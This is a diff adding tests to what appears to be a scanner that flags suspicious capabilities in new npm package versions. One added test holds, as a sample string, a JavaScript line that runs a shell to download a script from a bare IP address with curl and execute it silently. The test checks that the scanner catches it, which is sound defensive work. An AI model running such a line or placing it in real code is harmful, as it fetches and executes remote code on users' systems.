@@ -170,3 +170,15 @@ def test_lockfile_pnpm(tmp_path):
     p = tmp_path / "pnpm-lock.yaml"
     p.write_text("lockfileVersion: '9.0'\n\npackages:\n\n  '@tanstack/history@1.161.9':\n    resolution: {integrity: x}\n\n  ms@2.1.3:\n    resolution: {integrity: y}\n")
     assert lockfile.read(p) == {("@tanstack/history", "1.161.9"), ("ms", "2.1.3")}
+
+
+def test_shell_command_substitution_download():
+    code = b"require('child_process').exec('nohup bash -c \"$(curl -fsSL http://1.2.3.4/i.sh)\" > /dev/null 2>&1')"
+    rep = run(pkg("1.0.0"), pkg("1.0.1", {"lib.js": code}))
+    assert "new-capability:download_exec" in rule_names(rep)
+
+
+def test_first_published_ignores_security_placeholder():
+    pack = {"time": {"created": "2026-03-31T04:26:32Z", "4.2.0": "2026-03-30T05:57:32Z",
+                     "4.2.1": "2026-03-30T23:59:12Z", "0.0.1-security.0": "2026-03-31T04:26:33Z"}}
+    assert rules.first_published(pack) == "2026-03-30T05:57:32Z"
